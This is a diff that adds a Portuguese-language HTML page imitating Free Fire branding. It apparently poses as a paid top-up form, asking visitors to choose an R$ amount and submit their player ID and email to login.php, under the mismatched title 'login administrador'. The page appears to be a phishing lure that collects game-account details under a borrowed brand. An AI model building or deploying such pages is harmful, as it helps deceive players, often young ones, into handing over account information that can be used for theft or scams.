@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login administrador</title>
+    
+    <style>
+        body{
+           background-image: url('https://img.hype.games/cdn/1a543781-695e-460a-ae47-4b44b4f73988bab01644-7abb-4f22-958e-cf8507f7e85bfreefirebackgroundjune.jpg');
+        }
+        
+        div{
+            background-color: rgba(0, 0, 0, 0.9);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-50%);
+            padding: 80px;
+            border-radius: 15px;
+            color: #fff;
+        }
+        input{
+            background: #00ff03;
+            
+            border-radius: 30px;
+            padding: 15px;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            cursor: point;
+            font-weight: bold;
+            cursor: pointer;
+            
+        }
+        button{
+            background-color: dodgerblue;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            
+
+        }
+        button:hover{
+            background-color: black;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <script>alert('DIGITE O SEU ID CORRETAMENTE')</script>
+    
+    <form method="get" action="login.php">
+    <div>
+        <select id="senioridade" required name="valor" required>
+                  <option selected disabled value="">Selecione o método</option>
+                  <option>100 R$</option>
+                  <option>60 R$</option>
+                  <option>40 R$</option>
+                  <option>15 R$</option>
+                  <option>7 R$</option>
+                  <option>5 R$</option>
+                </select>
+
+        <h1><img src="https://img.hype.games/cdn/617f3fc9-7752-4482-a067-b4acd376421dfreefirelogo.png" alt="" style="width: 300px; "></h1>
+        <input type="number" placeholder=" digite o id" required name="id" >
+        <br><br>
+        <input type="email" placeholder="digite o seu email " required name="email">
+        
+        <br><br>
+        <button>verificar</button>
+        
+        
+        
+        </form>
+    </div>
+    
+
+</body>
+</html>
